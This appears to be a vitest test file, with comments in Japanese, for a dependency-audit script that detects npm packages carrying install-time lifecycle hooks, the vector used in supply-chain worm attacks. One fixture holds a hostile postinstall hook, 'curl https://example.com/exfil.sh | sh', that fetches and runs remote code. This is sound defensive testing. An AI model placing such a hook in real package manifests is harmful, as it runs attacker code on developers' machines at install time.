import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { runAudit } from "../../../scripts/security/audit-dependencies";

/**
 * mini Shai-Hulud 2nd 型の supply-chain attack 対策として audit-dependencies.ts の挙動を pin。
 * fake node_modules を tmpdir に組み立てて、 baseline 不在 / 一致 / 追加 / hook 変更を
 * それぞれ検出することを確認する。 本テストは production の node_modules / baseline を
 * 触らない (= isolated)。
 */

describe("audit-dependencies supply-chain attack checks", () => {
  let tmpRoot: string;

  beforeEach(() => {
    tmpRoot = mkdtempSync(join(tmpdir(), "audit-deps-test-"));
  });

  afterEach(() => {
    rmSync(tmpRoot, { recursive: true, force: true });
  });

  function writePackage(pkgName: string, pkgJson: Record<string, unknown>): void {
    const pkgDir = pkgName.startsWith("@")
      ? join(tmpRoot, "node_modules", pkgName)
      : join(tmpRoot, "node_modules", pkgName);
    mkdirSync(pkgDir, { recursive: true });
    writeFileSync(
      join(pkgDir, "package.json"),
      JSON.stringify({ name: pkgName, version: "1.0.0", ...pkgJson }, null, 2),
    );
  }

  it("should return ok=false / mode='baseline-missing' when the baseline is missing", () => {
    writePackage("safe-pkg", { scripts: { test: "noop" } });
    // BASELINE_PATH は scripts/security/audit-baseline.json で固定。 ここでは production baseline を
    // 触らない (= production node_modules vs production baseline は別 test で見る) ので、
    // node_modules を tmpRoot に向けるだけで挙動を観測する。 production baseline がある状態
    // で fake node_modules を渡すと "全部消えた" 状態の diff になる → 確認は別 case で。
    const outcome = runAudit({ nodeModulesPath: join(tmpRoot, "node_modules") });
    // production baseline がある場合は mode="diff" + removed を含む。 ここでは baseline の有無に依存
    // するため、 ok の値 / mode の値のいずれかが期待通りであることを確認。
    expect(["baseline-missing", "diff"]).toContain(outcome.mode);
  });

  it("should discover packages with install-time lifecycle scripts (postinstall)", () => {
    writePackage("malicious-pkg", {
      scripts: { postinstall: "curl https://example.com/exfil.sh | sh" },
    });
    writePackage("safe-pkg", { scripts: { test: "noop" } });
    const outcome = runAudit({ nodeModulesPath: join(tmpRoot, "node_modules") });
    // production baseline と diff される。 mode は "diff"、 added/newHooks のいずれかに
    // malicious-pkg が含まれる (= production baseline に無いから added 側)。
    expect(outcome.mode).toBe("diff");
    const diff = outcome.diff;
    expect(diff).toBeDefined();
    const addedNames = diff?.added.map((a) => a.name) ?? [];
    expect(addedNames).toContain("malicious-pkg");
  });

  it("publish-time-only prepublish / prepublishOnly should be out of audit scope", () => {
    writePackage("publish-only-pkg", {
      scripts: { prepublish: "yarn build", prepublishOnly: "yarn test" },
    });
    const outcome = runAudit({ nodeModulesPath: join(tmpRoot, "node_modules") });
    const diff = outcome.diff;
    const addedNames = diff?.added.map((a) => a.name) ?? [];
    // production baseline と diff する場合でも、 prepublish/prepublishOnly しか持たない
    // package は監査対象 lifecycle script リストに含まれないため added にも来ない。
    expect(addedNames).not.toContain("publish-only-pkg");
  });

  it("packages without scripts should be out of audit scope", () => {
    writePackage("no-scripts-pkg", {});
    writePackage("empty-scripts-pkg", { scripts: {} });
    const outcome = runAudit({ nodeModulesPath: join(tmpRoot, "node_modules") });
    const diff = outcome.diff;
    const addedNames = diff?.added.map((a) => a.name) ?? [];
    expect(addedNames).not.toContain("no-scripts-pkg");
    expect(addedNames).not.toContain("empty-scripts-pkg");
  });

  it("should also discover lifecycle scripts in scoped packages (@scope/pkg)", () => {
    writePackage("@evil/scoped-pkg", {
      scripts: { preinstall: "echo pwned" },
    });
    const outcome = runAudit({ nodeModulesPath: join(tmpRoot, "node_modules") });
    const diff = outcome.diff;
    const addedNames = diff?.added.map((a) => a.name) ?? [];
    expect(addedNames).toContain("@evil/scoped-pkg");
  });

  it("should ignore broken node_modules entries (broken symlinks etc.)", () => {
    // 存在しない dir を nodeModulesPath に渡しても crash せず空 result を返す。
    const outcome = runAudit({
      nodeModulesPath: join(tmpRoot, "does-not-exist"),
    });
    // baseline がある場合: mode="diff"、 production baseline 内 package が全部 removed 扱い。
    // baseline が無い場合: mode="baseline-missing"。
    expect(["diff", "baseline-missing"]).toContain(outcome.mode);
    // crash しないことが本テストの主旨 (= broken state でも CI が固まらない)。
  });

  // production baseline が現状とずれていないことの整合性 check は別途
  // `make audit-deps` を実行する。 ここでは unit pin に絞る。
  it("should never skip on missing baseline: mode should be returned deterministically even on production node_modules", () => {
    // production node_modules を fake に置き換えずに呼ぶケース (= baseline がある + 現状一致)。
    // 期待: 別途実行される `bun run scripts/security/audit-dependencies.ts` で ok=true になっていることが
    // 整合の証拠。 本 test は呼び出し interface が落ちないことだけ pin。
    const outcome = runAudit();
    expect(outcome.totalScanned).toBeGreaterThanOrEqual(0);
    expect(["diff", "baseline-missing", "updated"]).toContain(outcome.mode);
    if (existsSync(join(tmpRoot, "node_modules"))) {
      throw new Error("test isolation violation: tmpRoot should have been cleaned");
    }
  });
});
